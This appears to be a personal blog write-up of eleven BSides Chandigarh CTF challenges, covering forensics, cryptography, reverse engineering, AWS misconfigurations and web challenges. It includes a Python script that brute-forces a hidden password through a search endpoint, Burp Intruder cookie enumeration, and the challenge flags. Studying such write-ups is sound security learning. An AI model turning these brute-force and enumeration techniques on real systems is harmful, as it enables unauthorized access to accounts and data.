---
layout: post
title: Bsides Chandigarh CTF
image: /assets/img/Chandigarh/pfp.jpg
categories: [Pentesting, CTF]
tags: [/assets/img/Bsides, CTF, cybersecurity] 

---
# Bsides Chandigarh CTF

## **Challenge 1 : Sanity Check**

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled.png)

Base64 encoded string was given, just had to decode it using base64 -d or online decoder

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%201.png)

## **Challenge 2: Fix My Pdf**

We first use wget to download a corrupted pdf and then use ghostscript to try and repair it

```
gs -o repaired.pdf -sDEVICE=pdfwrite -dPDFSETTINGS=/prepress corrupted.pdf

But it turns out in kali this file was yet available to read, since this was a rabbit hole i dug deeper.
```

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%202.png)

I now used `binwalk` to check for hidden files.

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%203.png)

We can see there is a decrypt.txt, lets try and extract it.

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%204.png)

Its showing an invalid header, so we can just change it to match the header using Hexedit.

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%205.png)

We changed these bytes and now we are able to extract the file using pdftk

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%206.png)

The decrypt.txt was a simple python script which gave us the flag on running it.

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%207.png)

## **Challenge 3 : Crypto**

```python

from math import prod

def lagrange_interpol(x, xs, ys):
    sum = 0
    for i in range(len(xs)):
        numer = prod([(x - xs[j])/(xs[i] - xs[j]) for j in range(len(xs)) if i != j])
        sum += ys[i] * numer
    return sum

def recover_secret(shares):
    x_coords, y_coords = zip(*shares)
    secret_int = round(lagrange_interpol(0, x_coords, y_coords))
    return secret_int

# Shares
shares = [(1, 567683), (2, 570399), (3, 115050)]

# Recover secret
secret = recover_secret(shares)
print(f"CRAC{/{/{secret}/}/}")
```

Basically shamir sharing secrets, we had to get an integer output in the crac{flag}. I used lagrange interpolation manually instead of using libraries because i was facing some errors.

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%208.png)

## **Challenge 4: Fruit SLice**

I opened the file in ghidra and upon analysis i came across these hardcoded hex values, i took these to cyber chef.

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%209.png)

Then just Convert from hex to characters and then reverse it

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2010.png)

## **Challenge 5: My Bank**

Used [dcode.fr](http://dcode.fr) and validated the the isbns

First, used a little bash-fu (cut and sed) to remove the `-` and `:`

Then validated the lists. [https://www.dcode.fr/isbn-book-code](https://www.dcode.fr/isbn-book-code)

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2011.png)

Now made a python script to get my flag

```python
char = '✘'

correct = []
with open('results.txt','r') as f:
    for i in range(0,482):
        data = f.readline()
        if char in data:
            continue
        else:
            correct.append(data.split('\t')[0])
indexes = []
with open('list_isbn.txt','r') as base:
    for i in range(0,482):
        data = base.readline()
        # print(data)
        if (data.strip() in correct) and ('1' in str(i)):
            indexes.append(str(i))

flag = 'CRAC{' + ''.join(indexes) + '}'
print(flag)
```

list_isbn.txt is the list of cleaned isbns without the original indices and the original `-`

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2012.png)

## Challenge 6: Breached

This was a very fun challenge, i first just randomly clicked enter and also iterated through a - z using username parameter and came across the following:

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2013.png)

Now we know that flag format is `crac{`, so i used password filter to check for the same. And boom once again we get :

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2014.png)

This time we only got this user which means the flag is there and we must bruteforce it, i made a python script to do so. For some reason `‘{’` was not appending properly in my script so i ran it till infinity till my password did not increment anymore and then manually added the final 2 `‘}}’`

```python
import requests
import string

# Base URL
url = 'http://web.ctf.defhawk.com:5000/search-db'

# Headers
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'http://web.ctf.defhawk.com:5000/hogwartstechinc-breached-20231231',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://web.ctf.defhawk.com:5000',
    'Connection': 'close'
}

# Initial password
password = "crac\{\{ho"
chars = ''.join([chr(i) for i in range(32, 127)])
# Iterate over alphanumeric characters
while True:
    for char in string.ascii_letters + string.digits:
        print("Testing for ",char)
        payload = {'password': password + char}
        print(payload)
        response = requests.post(url, headers=headers, data=payload)
        print(response.text)
        
        if 'hogwarts' in response.text:
            password += char
            print(f"Password: {password}")

```
> In the code above please remove the `\` before and after the parantheses in the line `password=` i had to add them there because of double parantheses rendering issues.
{: .prompt-warning }

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2015.png)

At this point it started iteration again, and again which meant that we had found all the characters all that was left was to add the remaining `‘}}’`

`Password: crac{ {hohch0c73747d0e0e0wwissag} }`

**(Remove The Spaces, i added them to prevent jekyll from causing erros)**

`flag: CRAC{hohch0c73747d0e0e0wwissag}`

## Challenge 7: FlowLogs

This was quite easy just identify the ip from the logs based on the massive accepts and reject

`CRAC{172.31.32.37}`

## Challenge 8: Followme

Based on the given text i was able to formulate a url 

[https://console.aws.amazon.com/sns/v3/home?region=ap-south-1#/topic/arn:aws:sns:ap-south-1:666793061326:unlockv1](https://console.aws.amazon.com/sns/v3/home?region=ap-south-1#/topic/arn:aws:sns:ap-south-1:666793061326:unlockv1)

Then i realised i had to create a subscription to get an email or a text, so i used management console to do so

[https://ap-south-1.console.aws.amazon.com/sns/v3/home?region=ap-south-1#/subscriptions](https://ap-south-1.console.aws.amazon.com/sns/v3/home?region=ap-south-1#/subscriptions)

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2016.png)

after this we just verify email and the flag would be emailed in a few minutes

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2017.png)

## Challenge 9: Loop

This challenge dealt with an API Gateway endpoint.

I first made the url 
[https://h2vb2gupxd.execute-api.ap-south-1.amazonaws.com/prod/](https://h2vb2gupxd.execute-api.ap-south-1.amazonaws.com/prod/)

Since i was getting forbidden i re read the question i read something about collectBits, i thought that was the endpoint, so i added that.

[https://h2vb2gupxd.execute-api.ap-south-1.amazonaws.com/prod/collectBits/](https://h2vb2gupxd.execute-api.ap-south-1.amazonaws.com/prod/collectBits/)

`{"errorMessage": "'cookie'", "errorType": "KeyError", "requestId": "d07a64c9-880d-4022-acc8-df712bbd0d0f", "stackTrace": ["  File \"/var/task/lambda_function.py\", line 10, in lambda_handler\n    cookie_header = event['headers']['cookie']\n"]}`

This error message indicated that i needed a cookie with an integer value, i quickly spun up burp and checked for integer 0, it seemed as it i was gonna get the flag using integers in a row, so i used intruder to make my attack

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2018.png)

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2019.png)

After reading each individual response, 

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2020.png)

`CRAC{H0w_Many_C@lls_Y0u_Can_M@ke}`

## Challenge 10: OneCallAway

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2021.png)

Using ltrace i can see that the string was being compared to `vhvdph`, so now i can use that as input

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2022.png)

I got a string of decimal characters now trying to decode the following

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2023.png)

It indicated a flag but i would have to rearrange these to get the fional flag, before that i decided to look at the binary in IDA and BOOM

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2024.png)

`print_phrase_decimal -> This function had the flag stored in it and i just had to type it in !`

## Challenge 11: LOUDER

Find the flag and when they ask, say “hocus pocus”.

This hint just gave away the whole thing because it meant that we had to extract a file using steghide and the password was `hocus pocus`

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2025.png)

![Untitled](/assets/img/Bsides%20Chandigarh%20CTF%20a7731956d23c48518d7b48958789f1ea/Untitled%2026.png)